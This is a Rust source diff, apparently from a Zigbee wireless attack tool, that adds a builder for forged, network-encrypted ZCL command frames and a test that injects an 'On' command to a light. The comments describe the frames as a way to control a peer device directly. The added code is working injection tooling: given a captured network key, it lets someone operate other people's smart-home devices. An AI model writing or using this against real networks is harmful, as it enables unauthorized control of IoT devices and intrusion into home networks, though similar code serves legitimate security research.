@@ -282,6 +282,86 @@ pub fn build_zdp_inject(p: &ZdpInject) -> Result<Vec<u8>, String> {
     Ok(frame)
 }
 
+// ---- ZCL command injection: control a peer (the "it's a light" path) --------
+// A ZCL command is APS data on the functional cluster + HA profile, carrying a
+// ZCL header (frame control · txn seq · command id · payload). Unlike a ZDP
+// interview it expects no routed reply — with the default-response bit set the
+// target just acts on it — so injecting one actually controls the device.
+
+pub const ZCL_PROFILE_HA: u16 = 0x0104; // Home Automation application profile
+pub const CLUSTER_ON_OFF: u16 = 0x0006;
+pub const CLUSTER_LEVEL: u16 = 0x0008;
+pub const CLUSTER_COLOR: u16 = 0x0300;
+// On/Off cluster-specific command ids
+pub const ONOFF_OFF: u8 = 0x00;
+pub const ONOFF_ON: u8 = 0x01;
+pub const ONOFF_TOGGLE: u8 = 0x02;
+
+/// Everything to assemble one injectable ZCL command frame. Mirrors `ZdpInject`
+/// but for an application cluster: control a peer directly.
+pub struct ZclInject<'a> {
+    pub key: &'a [u8; 16],
+    pub src_eui64: &'a [u8; 8],
+    pub pan: u16,
+    pub target: u16,
+    pub src_short: u16,
+    pub frame_counter: u32,
+    pub mac_seq: u8,
+    pub nwk_seq: u8,
+    pub aps_counter: u8,
+    pub zcl_seq: u8,
+    pub radius: u8,
+    pub key_seq: u8,
+    pub profile: u16,
+    pub cluster: u16,
+    pub src_endpoint: u8,
+    pub dst_endpoint: u8,
+    pub cmd: u8,
+    /// true = cluster-specific (On/Off, Move-to-level…); false = global (read attr…).
+    pub cluster_specific: bool,
+    pub payload: &'a [u8],
+}
+
+/// Assemble the full injectable MAC frame for a ZCL command (no FCS — the radio
+/// appends it). Layers: ZCL · APS data header · NWK-secured · MAC.
+pub fn build_zcl_inject(p: &ZclInject) -> Result<Vec<u8>, String> {
+    // ZCL header: frame control · txn seq · command id · payload.
+    // FC: frame type (01 cluster-specific / 00 global) | disable-default-response (0x10).
+    let zcl_fc = if p.cluster_specific { 0x01u8 } else { 0x00 } | 0x10;
+    let mut zcl = Vec::with_capacity(3 + p.payload.len());
+    zcl.push(zcl_fc);
+    zcl.push(p.zcl_seq);
+    zcl.push(p.cmd);
+    zcl.extend_from_slice(p.payload);
+
+    // APS data header: fc · dst ep · cluster(2 LE) · profile(2 LE) · src ep · counter.
+    let mut aps = vec![
+        0x00,
+        p.dst_endpoint,
+        (p.cluster & 0xff) as u8,
+        (p.cluster >> 8) as u8,
+        (p.profile & 0xff) as u8,
+        (p.profile >> 8) as u8,
+        p.src_endpoint,
+        p.aps_counter,
+    ];
+    aps.extend_from_slice(&zcl);
+
+    let nwkh = nwk_header(p.target, p.src_short, p.radius, p.nwk_seq);
+    let nwk = secure_nwk(
+        p.key,
+        &nwkh,
+        &aps,
+        p.src_eui64,
+        p.frame_counter,
+        p.key_seq,
+        SEC_LEVEL_ENC_MIC32,
+    )?;
+    let mut frame = mac_header(p.mac_seq, p.pan, p.target, p.src_short);
+    frame.extend_from_slice(&nwk);
+    Ok(frame)
+}
+
 // ---- receive side: decrypt an arbitrary sniffed frame + parse ZDP replies ---
 // Injection (above) builds a fixed-shape header; sniffed frames are arbitrary, so
 // to decrypt them we must compute the NWK header length from the FCF (optional
@@ -662,6 +742,44 @@ mod tests {
         assert_eq!(src, 0xb56e, "source short address");
         // a non-data frame (ack, type 010) is rejected
         assert!(mac_data_header(&[0x02, 0x00, 0x00]).is_none());
+    }
+
+    #[test]
+    fn zcl_on_command_inject() {
+        // "Turn on the light at 0xabcd, endpoint 1" — On/Off cluster, On command.
+        let p = ZclInject {
+            key: &KEY,
+            src_eui64: &EUI,
+            pan: 0x0c84,
+            target: 0xabcd,
+            src_short: 0x7fff,
+            frame_counter: 50,
+            mac_seq: 0x10,
+            nwk_seq: 0x20,
+            aps_counter: 0x30,
+            zcl_seq: 0x40,
+            radius: 30,
+            key_seq: 0,
+            profile: ZCL_PROFILE_HA,
+            cluster: CLUSTER_ON_OFF,
+            src_endpoint: 1,
+            dst_endpoint: 1,
+            cmd: ONOFF_ON,
+            cluster_specific: true,
+            payload: &[],
+        };
+        let frame = build_zcl_inject(&p).unwrap();
+        assert_eq!(&frame[5..7], &[0xcd, 0xab], "MAC dst = the light");
+        // decrypt the NWK payload (8-byte minimal header) → APS + ZCL
+        let aps = unsecure_nwk(&KEY, &frame[9..], 8, SEC_LEVEL_ENC_MIC32).unwrap();
+        assert_eq!(aps[1], 0x01, "APS dst endpoint 1");
+        assert_eq!(&aps[2..4], &[0x06, 0x00], "cluster = On/Off");
+        assert_eq!(&aps[4..6], &[0x04, 0x01], "profile = HA 0x0104");
+        // ZCL header at aps[8..]: frame control · seq · command
+        assert_eq!(aps[8], 0x11, "ZCL fc: cluster-specific + disable default response");
+        assert_eq!(aps[9], 0x40, "ZCL txn seq");
+        assert_eq!(aps[10], 0x01, "ZCL command = On");
+        assert_eq!(aps.len(), 11, "no payload for a bare On");
     }
 
     #[test]
